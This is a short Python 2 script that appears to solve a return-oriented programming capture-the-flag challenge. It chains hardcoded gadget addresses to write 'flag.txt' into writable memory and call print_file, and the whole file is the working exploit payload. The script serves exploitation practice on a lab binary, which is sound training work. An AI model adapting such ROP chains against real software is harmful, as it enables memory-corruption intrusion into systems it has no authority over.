from binascii import hexlify
import struct

def p64(addr):
    return struct.pack("<Q", addr)

def pack_string(string):
    return int("0x" + "".join(map(lambda p: "".join(p), zip(hexlify(string)[::-1][1::2], hexlify(string)[::-1][0::2]))), 16)

offset = 40

# mov QWORD PTR [r14],r15; ret;
write_gadget = 0x0000000000400628

# > vmmap
write_loc = 0x0000000000601000 + 0x50

# pop r14; pop r15; ret;
pop_gadget = 0x0000000000400690

# pop rdi; ret
pop_argument_gadget = 0x0000000000400693
print_file = 0x0000000000400510

payload = "\x90" * offset +\
    p64(pop_gadget) + p64(write_loc) + p64(pack_string("flag.txt")) + p64(write_gadget) +\
    p64(pop_argument_gadget) + p64(write_loc) + p64(print_file)
print payload
